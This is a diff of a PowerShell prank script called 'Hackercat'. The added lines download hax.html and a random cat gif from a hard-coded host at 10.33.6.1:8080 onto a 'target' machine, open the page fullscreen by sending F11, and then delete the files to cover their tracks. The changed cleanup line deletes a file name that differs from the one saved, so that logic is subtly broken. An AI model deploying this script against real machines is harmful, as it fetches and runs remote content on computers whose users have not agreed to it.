@@ -15,13 +15,18 @@
 # Will Create a full screen of "Hackercat"
 
 $Destination = "~/documents"
+
+$Cats = 'meow.gif', 'mrow.gif', 'rage.gif', 'cat.gif'
+
+$Selection = $Cats[ (Get-Random -Maximum ([array]$Cats).count)]
+
 Function Invoke-Hackercat
 {
     Add-type -AssemblyName System.Windows.Forms
-    Start-process "http://giphy.com/gifs/cat-hacker-webs-o0vwzuFwCGAFO/fullscreen" -WindowStyle Maximized #This will just grab the gif from Giphy.
-#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/hax.html" -Destination "$Destination/hax.html" #This will download hax.html to the target to be ran locally.
-#    Start-BitsTransfer -Source "http://ENTER_IP_HERE/meow.gif" -Destination "$Destination/meow.gif" #This will download meow.gif to the target to be ran locally.
-#    start-process "$Destination/hax.html" -WindowStyle Maximized #This will start the process for hax.html to induce hackercat in whichever the default internet browser is.
+#    Start-process "http://giphy.com/gifs/cat-hacker-webs-o0vwzuFwCGAFO/fullscreen" -WindowStyle Maximized #This will just grab the gif from Giphy.
+    Start-BitsTransfer -Source "http://10.33.6.1:8080/hax.html" -Destination "$Destination/hax.html" #This will download hax.html to the target to be ran locally.
+    Start-BitsTransfer -Source "http://10.33.6.1:8080/$Selection" -Destination "$Destination/meow.gif" #This will download meow.gif to the target to be ran locally.
+    start-process "$Destination/hax.html" -WindowStyle Maximized #This will start the process for hax.html to induce hackercat in whichever the default internet browser is.
     Start-sleep 1 
     [System.Windows.Forms.SendKeys]::SendWait("{F11}") #After waiting, will hit F11 which will fullscreen the browser.
 
@@ -49,5 +54,5 @@ Function Invoke-Hackercat
 
 Invoke-Hackercat 
 if (Test-Path "$Destination/hax.html") { rm $Destination/hax.html; Write-Host "Deleted hax.html" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
-if (Test-Path "$Destination/meow.gif") { rm $Destination/meow.gif; Write-Host "Deleted meow.gif" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
+if (Test-Path "$Destination/meow.gif") { rm $Destination/$Selection; Write-Host "Deleted $Selection" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
 Write-Host "Hackercat has finished!"
